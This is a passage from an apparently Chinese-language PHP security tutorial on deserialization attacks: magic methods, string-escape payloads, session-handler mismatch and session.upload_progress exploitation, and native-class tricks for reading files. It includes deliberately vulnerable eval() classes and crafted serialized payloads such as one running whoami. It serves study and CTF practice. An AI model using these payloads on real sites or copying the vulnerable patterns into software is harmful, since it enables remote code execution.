输出调用不存在的方法名\n          print_r($arguments); // 输出调用不存在的方法时的参数列表\n          echo \")不存在！<br>\\n\"; // 结束换行                      \n    }                                          \n}\n$Person = new Person();            \n$Person->run(\"teacher\"); // 调用对象中不存在的方法，则自动调用了对象中的__call()方法\n$Person->eat(\"小明\", \"苹果\");             \n$Person->say();\n/*\n你所调用的函数：run(参数：Array\n(\n    [0] => teacher\n)\n)不存在！\n你所调用的函数：eat(参数：Array\n(\n    [0] => 小明\n    [1] => 苹果\n)\n)不存在！\nHello, world!\n*/\n```\n\n### __callStatic()方法\n\n当调用一个不存在的**静态**方法或者是不可访问的**静态**方法时，会触发\n\n静态方法和动态方法的区别\n\n静态方法和动态方法的区别就是，调用方式不同，我们上面所调用的方法都是动态方法，而静态方法是直接利用类名来调用的而不是对象\n\n举个例子\n\n```php\n<?php\nclass me{\n    public static function add($a,$b){#静态方法是使用static去定义的\n        return $a + $b;\n    }\n}\necho me::add(2,3);#静态方法直接通过类名去调用\n/*\n5\n*/\n#静态方法只能访问类的静态变量和静态方法，不能直接访问类的实例变量或实例方法\n```\n\n种就是静态方法的调用，而我们如何去触发这个魔术方法也很简单\n\n```php\n<?php\nclass Demo{\n    public static function __callStatic($method, $args){\n        echo \"callStatic被调用\\n\";\n    }\n}\nDemo::what(5,10);\n//callStatic被调用\n```\n\n### __get()方法\n\n读取不可访问或者是不存在的属性时触发，用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行\n\n举个例子：\n\n```php\n<?php\nclass Person\n{\n    private $name;\n    private $age;\n \n    function __construct()\n    {\n        $this->name = \"meng\";\n        $this->age = \"19\";\n    }\n    public function __get($propertyName)\n    {  \n        echo\"__get方法被调用\\n\";\n        return $this->$propertyName;\n    }\n}\n$Person = new Person();   // 通过Person类实例化的对象\necho serialize($Person);\necho \"\\n\";\necho $Person->name;  // 调用私有属性的时候，__get方法被调用\necho \"\\n\"; \necho $Person->langages;   // 调用不存在的属性时候，__get方法被调用\n/*\nO:6:\"Person\":2:{s:12:\"Personname\";s:4:\"meng\";s:11:\"Personage\";s:2:\"19\";}\n__get方法被调用\nmeng\n__get方法被调用\n*/\n```\n\n### __set()方法\n\n将数据写入不可访问或者不存在的属性，即设置一个类的成员变量，也就是说赋值时触发\n\n举个例子:\n\n```php\n<?php\nclass Person\n{\n    private $name;\n    private $age;\n \n    function __construct()\n    {\n        $this->name = \"meng\";\n        $this->age = \"19\";\n    }\n    public function __set($property, $value) {\n        $this->$property = $value;\n    }\n}\n\n$Person=new Person(); \necho serialize($Person); //输出序列化后的字符串\necho \"\\n\";   \n$Person->language = \"CN\";//设置不存在的属性language的值为CN\n$Person->age = 16; //设置不可访问属性age的值为16\necho serialize($Person);; //输出序列化后的字符串\n/*\nO:6:\"Person\":2:{s:12:\"Personname\";s:4:\"meng\";s:11:\"Personage\";s:2:\"19\";}\nO:6:\"Person\":3:{s:12:\"Personname\";s:4:\"meng\";s:11:\"Personage\";i:16;s:8:\"language\";s:2:\"CN\";}\n*/\n```\n\n### __isset()方法\n\n在不可访问的属性上调用isset()或empty()时触发\n\n#### isset()函数\n\n`isset()`是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。\n\n分两种情况，如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性，如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。但你只要在类里面加上一个`__isset()`方法就可以在对象的外部使用这个函数了，当在类外部使用`isset()`函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的`__isset()`方法了帮我们完成这样的操作。\n\n举个例子\n\n```php\n<?php\nclass Person\n{\n    private $name;\n    public $age;\n \n    function __construct()\n    {\n        $this->name = \"meng\";\n        $this->age = \"19\";\n    }\n    public function __isset($name) {\n        echo \"isset被调用了\\n\";\n        echo  isset($this->$name);\n    }\n}\n\n$a=new Person();\necho isset($a->name);\necho \"\\n\";\necho isset($a->age);\n/*\nisset被调用了\n1\n1\n*/\n```\n\n### __unset()方法\n\n使用 `unset()` 删除一个不存在或不可访问的属性时，`__unset()` 方法会被调用。\n\n这里自然也是分两种情况：\n\n1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。\n\n2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。\n\n同样如果你在一个对象里面加上`__unset()`这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了`__unset()`这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用`__unset()`函数来帮我们删除对象内部的私有成员属性。\n\n举个例子\n\n```php\n<?php\nclass Person\n{\n    private $name;\n    public $age;\n \n    function __construct()\n    {\n        $this->name = \"meng\";\n        $this->age = \"19\";\n    }\n    public function __unset($name) {\n        echo \"unset被调用了\\n\";\n        unset($this->$name);\n    }\n}\n\n$a=new Person();\necho serialize($a);\necho \"\\n\";\nunset($a->name);\necho serialize($a);\necho \"\\n\";\nunset($a->age);\necho serialize($a);\n\n/*\nO:6:\"Person\":2:{s:12:\"Personname\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";}\nunset被调用了\nO:6:\"Person\":1:{s:3:\"age\";s:2:\"19\";}\nO:6:\"Person\":0:{}\n*/\n```\n\n### __invoke()方法\n\n当你尝试将一个对象像函数一样调用时，`__invoke()` 会被触发。\n\n注意：\n\n```php\n本特性只在 PHP 5.3.0 及以上版本有效。\n```\n\n```php\n<?php\nclass Person\n{\n    private $name;\n    public $age;\n \n    function __construct()\n    {\n        $this->name = \"meng\";\n        $this->age = \"19\";\n    }\n    public function __invoke() {\n        echo \"invoke被调用\\n\";\n    }\n}\n\n$a=new Person();\n$a(); \necho serialize($a);\n/*\ninvoke被调用\nO:6:\"Person\":2:{s:12:\"Personname\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";}\n*/\n```\n\n接下来我们讲一下一个特别的魔术方法\n\n### __wakeup()方法\n\n**调用unserialize()时触发**，反序列化恢复对象之前调用该方法，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。\n\n正常来说`wakeup`魔术方法会先被触发，然后再进行反序列化\n\n```php\n<?php\nclass Person\n{\n    public $sex;\n    public $name;\n    public $age;\n \n    public function __construct()\n    {\n        $this->name = \"meng\";\n        $this->age  = \"19\";\n        $this->sex  = \"男\";\n    }\n    public function __sleep() {\n        echo \"__sleep()方法被调用\\n\";\n        $this->name ;\n        return array('name', 'age'); // 这里必须返回一个数值，里边的元素表示返回的属性名称\n    }\n \n    /**\n     * __wakeup\n     */\n    public function __wakeup() {\n        echo \"__wakeup()方法被调用\\n\";\n        $this->age = '18';\n        $this->sex = '女';\n        // 这里不需要返回数组\n    }\n}\n \n$person = new Person(); // 实例化Person类\necho serialize($person);\n$a=unserialize(serialize($person));\nvar_dump($a);\n/*\n__sleep()方法被调用\nO:6:\"Person\":2:{s:4:\"name\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";}__sleep()方法被调用\n__wakeup()方法被调用\nobject(Person)#2 (3) {\n  [\"sex\"]=>\n  string(3) \"女\"\n  [\"name\"]=>\n  string(4) \"meng\"\n  [\"age\"]=>\n  string(2) \"18\"\n}\n*/\n```\n\n由此可见__wakeup方法可以修改属性的值\n\n## 反序列化攻击原理\n\n**1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在**\n\n这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。\n\n**(2)我们在反序列化攻击的时候也就是依托类属性进行攻击**\n\n因为没有序列化方法，我们只有类的属性可以达到可控，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击\n\n## 姿势一：字符串逃逸\n\n这个可谓是常用的姿势了，那么原理是什么呢，为什么要逃逸字符串呢\n\n引子\n\n在php中，反序列化的过程必须严格按照序列化规则才能实现反序列化\n\n举个例子\n\n```php\n<?php\n$str = 'a:2:{i:0;s:5:\"admin\";i:1;s:8:\"password\";}';\nvar_dump(unserialize($str));\n//输出结果\narray(2) {\n  [0]=>\n  string(5) \"admin\"\n  [1]=>\n  string(8) \"password\"\n}\n```\n\n一般情况下，按照我们的正常理解，上面例子中变量`$str`是一个标准的序列化后的字符串，按理来说改变其中任何一个字符都会导致反序列化失败。但事实并非如此。如果在`$str`结尾的花括号后加一些字符，输出结果是一样的。\n\n```php\n<?php\n$str = 'a:2:{i:0;s:5:\"admin\";i:1;s:8:\"password\";}123';\nvar_dump(unserialize($str));\n#输出结果依然和上面的相同\n```\n\n这就说明了在花括号外面的字符是不会影响字符串本身的反序列化操作的\n\n#### php反序列化的几大特性\n\n1.php在反序列化时，底层代码是以`;`作为字段的分隔，以`}`作为结尾，并且是**根据长度判断内容** ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。\n\n- 注意，字符串序列化是以`;}`结尾的，但对象序列化是直接`}`结尾\n- php反序列化字符逃逸，就是通过这个结尾符实现的，结尾符后面的内容不会影响php反序列化的结果\n\n2.当长度不对应的时候会出现报错\n\n#### 反序列化字符逃逸\n\n反序列化之所以存在字符串逃逸，最主要的原因是代码中存在针对序列化后的字符串进行了过滤操作（变多或者变少）\n\n反序列化字符逃逸问题根据过滤函数一般分为两种，字符数增多和字符数减少\n\n#### 字符增多\n\n```php\n<?php\nclass name{\n    public $username;\n    public $password;\n\n    public function __construct($username,$password){\n        $this->username=$username;\n        $this->password=$password;\n    }\n}\n$str1 = new name(\"a\",\"b\");\necho serialize($str1);\n//输出结果:\nO:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:1:\"b\";}\n```\n\n问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是`123456`，而不是`b`？\n\n如果我们之间修改password的值的话，必然会因为字符串的个数不一样而导致报错\n\n- 正常情况下反序列化字符串**$str1**的值为`O:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:1:\"b\";}`\n\n此时我们加上替换函数\n\n```php\n<?php\nclass name{\n    public $username;\n    public $password;\n\n    public function __construct($username,$password){\n        $this->username=$username;\n        $this->password=$password;\n    }\n}\nfunction filter($s){\n    return str_replace(\"x\",\"yy\",$s);\n}\n$str1 = new name(\"a\",\"b\");\n```\n\n那么把username的值变为`x`，当完成序列化，filter函数处理后的结果为\n\n```php\nO:4:\"name\":2:{s:8:\"username\";s:1:\"x\";s:8:\"password\";s:1:\"b\";}//替换前\nO:4:\"name\":2:{s:8:\"username\";s:1:\"yy\";s:8:\"password\";s:1:\"b\";}//替换后\n```\n\n替换成功了，然后我们进行反序列化会发现反序列化失败了，这是因为替换后的字符串的长度不对应导致的\n\n- 所以，我们是否可以利用多出来的字符串做一些坏事？\n\n想要password是`123456`，反序列化化前的字符串要是 `O:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:6:\"123456\";}`\n\n如果说我们输入的是\n\n`O:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:6:\"123456\";}\";s:8:\"password\";s:1:\"b\";}`\n\n那么此时我们就需要把`\";s:8:\"password\";s:6:\"123456\";}`给挤出来，让`\";s:8:\"password\";s:1:\"b\";}`失效，我们该如何构造字符逃逸呢？\n\n已知admin会换成hacker，多出一个字符，我们对比替换前后的字符再加上我们需要构造的序列化字符串\n\n```\nO:4:\"name\":2:{s:8:\"username\";s:2:\"ax\";s:8:\"password\";s:1:\"b\";}//替换前\nO:4:\"name\":2:{s:8:\"username\";s:2:\"ayy\";s:8:\"password\";s:1:\"b\";}//替换后\nO:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:6:\"123456\";}\";s:8:\"password\";s:1:\"b\";}//需要构造的序列化字符串\n```\n\n那么我们需要逃逸的字符串就是\n\n```\n\";s:8:\"password\";s:6:\"123456\";}//个数为31\n```\n\n需要逃逸31个字符，一个x可以换成2个y，多出一个字符，那我们构造31个x，这样替换后多出来的31个y就可以把我们需要逃逸的字符串挤出来\n\n![image-20250321210048777](../image/achieve/202411/PHP反序列化/image-20250321210048777.png)\n\n上下进行对比，可以看到username的内容的长度是一致的，此时`s:8:\"password\";s:6:\"123456\";}`就替换掉了`s:8:\"password\";s:1:\"b\";}`的内容，因为两个变量的长度都是和内容对应一致的，那么此时反序列化操作是不会受影响的，多余的子串会被抛弃\n\n#### 字符减少\n\n```php\n<?php\nclass name{\n    public $username;\n    public $password;\n\n    public function __construct($username,$password){\n        $this->username=$username;\n        $this->password=$password;\n    }\n}\nfunction filter($s){\n    return str_replace(\"xx\",\"y\",$s);\n}\n$str1 = new name(\"a\",\"b\");\n```\n\n问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是`123456`，而不是`biubiu`？\n\n正常情况下反序列化字符串**$str1**的值为 `O:4:\"name\":2:{s:8:\"username\";s:1:\"a\";s:8:\"password\";s:1:\"b\";}`\n\n如果我们的username的值是xx呢？\n\n```\nO:4:\"name\":2:{s:8:\"username\";s:2:\"y\";s:8:\"password\";s:1:\"b\";}\n```\n\n成功替换并且少了一个字符，那么我们该如何利用字符减少的方法去进行字符串逃逸呢？\n\n假如我们需要让password的值为123456，那么我们最终要实现的序列化字符串就是\n\n```\nO:4:\"name\":2:{s:8:\"username\";s:2:\"y\";s:8:\"password\";s:6:\"123456\";}\n```\n\n那么此时我们就需要让`\";s:8:\"password\";s:1:\"b\";}`失效，我们该如何构造字符逃逸呢？\n\n```\nO:4:\"name\":2:{s:8:\"username\";s:2:\"y\";s:8:\"password\";s:1:\"b\";}“;s:8:\"password\";s:6:\"123456\";}\n```\n\n和字符增多不同的是，需要逃逸的字符是不变的，但是我们需要计算的长度是要使之失效的字符的长度\n\n```\n\";s:8:\"password\";s:1:\"b\";}//26个\n```\n\n需要替换掉26个字符，已知传入xx会替换成y，减少一个字符，那我们需要让最后的y是26个，那么就需要传入52个x\n\n![image-20250321211735531](../image/achieve/202411/PHP反序列化/image-20250321211735531.png)\n\n从图中可以看到，username的上下的长度是一样的，所以反序列化不会受影响\n\n#### 总结\n\n- 当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸\n- 当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替\n\n## 姿势二：session反序列化\n\n参考文章：[session反序列化 ](https://www.cnblogs.com/GTL-JU/p/16859098.html)\n\n讲到session反序列化，我们需要先了解什么是session\n\n#### 什么是session\n\n`Session`一般称为“会话控制“，简单来说就是是一种客户与网站/服务器更为安全的对话方式。一旦开启了 `session` 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同，这里我们讲一下PHP session机制\n\n#### PHP session机制\n\n`PHP session`可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，`PHP Session` 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 `session` 值会存储于服务器端，这也是与 `cookie`的主要区别，所以`seesion` 的安全性相对较高。\n\n那我们为什么要用session呢?\n\n我们访问网站的时候使用的协议是http或者https，但是http是一种无状态协议，是没有记忆的，也就是说，每次请求都是独立的，服务器不会记得上一次请求的信息，例如我们在一个web应用程序中的login页面进行了登录，但是这个登录仅仅只是在当前页面上进行的，如果我们访问同一应用上的其他页面，还是会需要我们登录，这就导致了我们重复的进行操作带来的不便性。所以session能用来弥补这个缺点，帮助服务器跟踪用户状态\n\n那session是通过什么来跟踪的呢？这里就用到了sessionID 生成与存储了\n\n当我们首次访问一个网站的时候，此时会话就开始了，就会产生一个独一无二的ID，然后产生了cookie，`cookie`是一个缓存用于一定时间的身份验证，在同一域名下面是全局的，所以说在同一域名下的页面都可以访问到`cookie`,但是大家都知道`cookie`我们是可以进行修改的,这样的话会很不安全，所以就产生了session，但是session是保存在服务器端的，所以`cookie`和`session`有本质的不同\n\n当开始一个会话时，PHP会尝试从请求中查找会话ID，（通常通过会话 `cookie`），如果发现请求的`Cookies`、`Get`、`Pos`t中不存在`session id`，PHP 就会自动调用`php_session_create_id`函数创建一个新的会话，并且在`http response`中通过`set-cookie`头部发送给客户端保存\n\n- **Session**：数据存储在服务器端，客户端仅保存一个唯一的会话 ID，用于与服务器通信。\n- **Cookie**：数据存储在客户端浏览器中，服务器不存储这些数据。\n\n#### session的产生和存储\n\nsession_start()会创建新会话或者重用现会话。如果会话ID是通过GET,POST或者使用cookie提交，则会重用现有会话\n\n当会话自动开始或者通过session_start()手动开始的时候，PHP内部会调用open和read回调函数，会话处理程序可能是PHP默认的，也可能是扩展提供的，也可能是通过session_set_save_handler()设定的用户自定义会话处理程序。通过read回调函数返回的现有会话数据(使用特殊的序列化格式存储)，PHP会自动反序列化数据并且填充$_SESSION超级全局变量\n\n那我们先来看看存储的路径在哪里:\n\n```PHP\n<?php \nhighlight_file(__FILE__);\nsession_start();\necho session_id();\necho \"<br>\";\necho $_COOKIE[\"PHPSESSID\"];\n?>\n```\n\n![image-20250414124612334](../image/achieve/202411/PHP反序列化/image-20250414124612334.png)\n\n可以看到这里随机生成了一个session_id的，而且生成的session_id会存入到cookie中\n\n然后我们看一下session会保存在哪里，之前我们就讲过，session 是会保存在服务器下的临时目录的，一般都在tmp目录下，或者我们可以在php.ini文件中进行修改\n\n```\nLinux下常见的保存位置\n/var/lib/php5/sess_PHPSESSID\n/var/lib/php7/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSED\n```\n\n这些是常见的保存位置，那我们接下来看一下php.ini中对session的配置\n\n#### session在php.ini的配置\n\n先看看php.ini中对session的配置\n\n![image-20250414154944152](../image/achieve/202411/PHP反序列化/image-20250414154944152.png)\n\n```php\nsession.save_path = /var/lib/php/sessions#session保存到/var/lib/php/sessions目录\nsession.save_handler = files#session的存储方式。这里是存储为files类型的文件\nsession.serialize_handler = php#session默认的序列化引擎是php\nsession.auto_start = Off#session是否默认打开。即是否默认开启session_start()，如果为On则不需要人为使用session_start()\nsession.name=PHPSESSID#session默认是以sess_PHPSESSID命名\n```\n\nPHP session`的存储机制是由`session.serialize_handler`来定义引擎的，默认是以文件的方式存储，且存储的文件是由`sess_sessionid`来决定文件名的，当然这个文件名也不是不变的，如`Codeigniter`框架的 `session`存储的文件名为`ci_sessionSESSIONID\n\n那这里的PHPSESSID是否是可控的呢？我们在页面下尝试更改一下cookie\n\n![image-20250417144849353](../image/achieve/202411/PHP反序列化/image-20250417144849353.png)\n\n然后我们在本地也可以看到我们的session的文件名发生了改变\n\n![image-20250417152511397](../image/achieve/202411/PHP反序列化/image-20250417152511397.png)\n\n当然文件的内容始终是session的值序列化后的内容\n\n上面也提到了session的序列化引擎，下面介绍了三种引擎\n\n```\nphp\t键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值\nphp_binary\t键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值\nphp_serialize (php>=5.5.4)\t经过 serialize() 函数反序列处理的数组\n```\n\n在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set('session.serialize_handler', '需要设置的引擎');。我们尝试一下\n\nPHP引擎\n\n```PHP\n<?php \nhighlight_file(__FILE__);\nini_set('session.serialize_handler','php');\nsession_start();\n$_SESSION['test']=$_GET['a'];\necho $_SESSION['test'];\necho \"<br>\";\necho session_id();\necho \"<br>\";\necho $_COOKIE[\"PHPSESSID\"];\n?>\ntest\n123456\n123456\n```\n\n得到\n\n```php\nphp:  test|s:4:\"test\";\n\nphp_binary:       \u0003tests:4:\"test\";\n\nphp_serialize(php>5.5.4):        a:1:{s:4:\"test\";s:4:\"test\";}\n```\n\nphp_binary中的键名前面的就是键名长度对应的ascii字符，可能显示不出来\n\n#### 反序列化\n\n上面我们具体了解了session的一些配置和基础，然后现在来讲一下session反序列的内容\n\n首先来看一下session的一些相关函数\n\n#### session_start()函数\n\n![image-20250417154711101](../image/achieve/202411/PHP反序列化/image-20250417154711101.png)\n\n这里关注到一句话：\n\n```\n通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。\n```\n\n并且这个read回调函数的触发\n\n```\n当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话处理程序的 open 和 read 回调函数。\n```\n\n也就是说，当会话开始时，session就会通过指定的序列化引擎将`$_SESSION`序列化。然后放入文件进行存储。那么当我们再次开启对话的时候他也会调用read()回调函数进行自动反序列化并填充`$_SESSION`，具体步骤就是\n\n```php\nsession_start()#session_start()->读取session文件内容->反序列化\n$_SESSION['test']='test';#序列化serialize($_SESSION)->存入文件\n```\n\n所以session反序列化攻击的方法就是：\n\n#### 攻击原理\n\n我们把恶意数据进行序列化后传入到session_id指定的session 文件中，然后在开启会话的时候就会触发read回调函数，并返回会话数据，php会把我们传入的数据进行反序列化操作，这样就会触发反序列化漏洞。\n\n但是这里的话需要**根据session的序列化引擎去处理我们需要写入session文件的内容**\n\n通过存入文件和反序列化的操作我们可以知道，反序列化的操作往往都是根据页面中指定的序列化引擎也就是local value去进行反序列化操作的，而存入服务器的文件往往都是根据php配置文件中指定的默认引擎的格式去进行存入的，所以我们可以知道，**Session反序列化其实就是序列化引擎不一致导致存在反序列化攻击**\n\n总结来说，PHP`session`反序列化漏洞，是当序列化存储`Session`数据与反序列化读取`Session`数据的方式不同时产生的。\n\n我们本地测试一下\n\n漏洞页面代码\n\n```php\n<?php\nhighlight_file(__FILE__);\nini_set('session.seralize_handler','php');\nsession_start();\nclass Test{\n    public $test;\n    function __wakeup(){\n        eval($this->test);\n    }\n}\n?>\n```\n\n这里使用的是php反序列化引擎\n\nsession传参页面\n\n```php\n<?php\nhighlight_file(__FILE__);\nini_set('session.serialize_handler','php_serialize');\nsession_start();\nif(isset($_GET['test'])){\n    $_SESSION['test']=$_GET['test'];\n}else {\n    echo \"请传入参数test\";\n}\n?>\n请传入参数test\n```\n\n此时我们随便传入1，并看一下session文件的内容\n\n```\na:1:{s:4:\"test\";s:1:\"1\";}\n```\n\n然后我们尝试对class Test进行序列化操作，反序列化会触发`__wakeup`\n\n```php\n<?php\nclass Test{\n    public $test = \"phpinfo();\";\n    function __wakeup(){\n        eval($this->test);\n    }\n}\n$a = new Test();\necho serialize($a);\n//O:4:\"Test\":1:{s:4:\"test\";s:10:\"phpinfo();\";}\n```\n\n但是需要注意的是，在漏洞利用页面使用的是php引擎，如果我们直接传入序列化字符串的话，是并不会触发反序列化漏洞的，因为我们存储session使用的session序列化引擎是session_serialize，跟漏洞利用的引擎不同\n\n![image-20250417162337395](../image/achieve/202411/PHP反序列化/image-20250417162337395.png)\n\n然后我们可以注意到，当引擎是php的时候，php引擎的格式如下\n\n```\nphp\t键名 ＋ | ＋ 经过 serialize() 函数反序列处理的值\n```\n\n反序列化处理的是在竖线后面的键值，那么如果我们手动构造一个竖线的话，是否可以让我们竖线后面的序列化字符串实现反序列化操作呢？\n\n![image-20250417162552930](../image/achieve/202411/PHP反序列化/image-20250417162552930.png)\n\n确认内容存入session文件后，我们在漏洞利用页面触发反序列化，刷新一下就行\n\n![image-20250417162508593](../image/achieve/202411/PHP反序列化/image-20250417162508593.png)\n\n成功反序列化并执行phpinfo函数\n\n然后讲完了session反序列化，这里再讲一个关于文件上传的session反序列化\n\nphp中的session.upload_progress\n\n参考师傅文章：https://chenlvtang.top/2021/04/13/PHP%E4%B8%ADsession-upload-progress%E7%9A%84%E5%88%A9%E7%94%A8/\n\n首先我们先关注几个php.ini配置\n\n![image-20250417170043320](../image/achieve/202411/PHP反序列化/image-20250417170043320.png)\n\n我们逐步解析一下\n\n- `session.upload_progress.enabled = on`\n\n`enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；\n\n- `session.upload_progress.cleanup = on`\n\n`cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容；有时候开启on如果要打session反序列化的话我们就需要进行条件竞争\n\n- `session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"`\n\n这个配置定义了在文件上传过程中用于跟踪上传进度的表单字段名。\"PHP_SESSION_UPLOAD_PROGRESS\"是这个配置项的默认值。它允许服务器端跟踪文件上传的进度。最大的利用点就是它的值是可控的\n\n- `session.upload_progress.prefix = \"upload_progress_\"`\n\n这个配置定义了用于存储上传进度信息的会话变量的前缀。结合name的话将表示为session中的键名\n\n我们根据官方的测试来试一下\n\n```html\n<form action=\"http://124.223.25.186/test.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name='PHP_SESSION_UPLOAD_PROGRESS' value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n```\n\n然后session中存储的上传进度内容如下\n\n```php\n<?php\n$_SESSION[\"upload_progress_123\"] = array(\n \"start_time\" => 1234567890,   // The request time\n \"content_length\" => 57343257, // POST content length\n \"bytes_processed\" => 453489,  // Amount of bytes received and processed\n \"done\" => false,              // true when the POST handler has finished, successfully or not\n \"files\" => array(\n  0 => array(\n   \"field_name\" => \"file1\",       // Name of the <input/> field\n   // The following 3 elements equals those in $_FILES\n   \"name\" => \"foo.avi\",\n   \"tmp_name\" => \"/tmp/phpxxxxxx\",\n   \"error\" => 0,\n   \"done\" => true,                // True when the POST handler has finished handling this file\n   \"start_time\" => 1234567890,    // When this file has started to be processed\n   \"bytes_processed\" => 57343250, // Amount of bytes received and processed for this file\n  ),\n  // An other file, not finished uploading, in the same request\n  1 => array(\n   \"field_name\" => \"file2\",\n   \"name\" => \"bar.avi\",\n   \"tmp_name\" => NULL,\n   \"error\" => 0,\n   \"done\" => false,\n   \"start_time\" => 1234567899,\n   \"bytes_processed\" => 54554,\n  ),\n )\n);\n```\n\n这里可以看到session中的field_name和name都是我们可控的\n\n例如我们试一下\n\n漏洞页面代码\n\n```php\n<?php\n//A webshell is wait for you\nini_set('session.serialize_handler', 'php');\nsession_start();\nclass Test\n{\n    public $name;\n    function __destruct()\n    {\n        eval($this->name);\n    }\n}\nif(isset($_GET['phpinfo']))\n{\n    $m = new Test();\n}\n```\n\n这里可以看到，如果我们传入一个phpinfo的话，**当一个对象销毁时被调用会调用__destruct析构方法**，所以会触发phpinfo函数\n\n所以我们只需要改变Test类中的name变量就能触发反序列化进行恶意RCE\n\n因为我们在代码中对引擎进行了处理，这里序列化引擎的局部变量(local value)是`php`，而全局变量`master value`是`php_serialize`，所以才会造成反序列化攻击，然后我们看到`session.upload_progress.enabled`也为开启状态，所以我们就可以利用`upload_progess`来构造一个可控的session。这里还有一个细节就是，`session.uoload_progress.cleanup`要设置为off(默认为on)，这样seesion才不会被自动清除。（如果为on可以利用条件竞争，用burp不断发包）\n\n我这里把cleanup设置为off，这样也方便测试\n\n![image-20250417172514721](../image/achieve/202411/PHP反序列化/image-20250417172514721.png)\n\n然后我们构造请求包\n\n```html\n<form action=\"测试地址\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name='PHP_SESSION_UPLOAD_PROGRESS' value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n```\n\n![image-20250417173120357](../image/achieve/202411/PHP反序列化/image-20250417173120357.png)\n\nfilename就改为我们需要传入的序列化字符串，因为页面中的序列化引擎是php，那么我们传入\n\n```\nO:4:\"Test\":1:{s:4:\"name\";s:13:\"echo `whoami`\";}\n```\n\n注意转义序列化数据中的双引号，或者filename=使用单引号包裹字符串，然后还需要设置cookie，由于没有 `PHPSESSID`，PHP **不会** 创建或读取 Session 文件。如果我们设置PHPSESSID，由于携带了 `PHPSESSID`，PHP 会尝试读取或创建对应的 Session 文件\n\n另外，如果我们在name中传入序列化字符串也是可以的\n\n![image-20250417183953230](../image/achieve/202411/PHP反序列化/image-20250417183953230.png)\n\n## 关于PHP原生类的利用\n\n### 读取文件\n\n原生类SplFileObject读取文件\n\n这里用php原生类SplFileObject读/flag\n\n![image-20250519094207459](../image/achieve/202411/java学习/image-20250519094207459.png)\n\nSplFileObject 类中的fgets和fread方法都可以读文件，尽管这些方法没有参数，但是filename文件名是在类中确定的，所以直接传文件名就行\n\n### 遍历文件目录\n\n可以遍历文件目录的原生类\n\n```\nDirectoryIterator \nFilesystemIterator \nGlobIterator \n```\n\n这三个类可以遍历文件目录，也可以搭配伪协议使用\n\n```php\n<?php\nhighlight_file(__FILE__);\n$dir = new DirectoryIterator('.');\n\nforeach($dir as $a ){\n    echo $a.\"<br>\";\n}\n```\n\n这样的话会遍历根目录下的文件\n\n### 绕过md5/hash\n\n**这里我们可以使用原生类Error或者Exception，只不过 Exception 类适用于PHP 5，7和8，而 Error 只适用于 PHP 7和8。**\n\nException原生类\n\n(PHP 5, PHP 7, PHP 8)\n\n**Exception**是所有用户级异常的基类。\n\n关于类的摘要\n\n![image-20250218163230150](../image/achieve/202411/java学习/image-20250218163230150.png)\n\n属性:\n\n- message\n\n  异常消息内容\n\n- code\n\n  异常代码\n\n- file\n\n  抛出异常的文件名\n\n- line\n\n  抛出异常在该文件中的行号\n\n- previous\n\n  之前抛出的异常\n\n- string\n\n  字符串形式的堆栈跟踪\n\n- trace\n\n  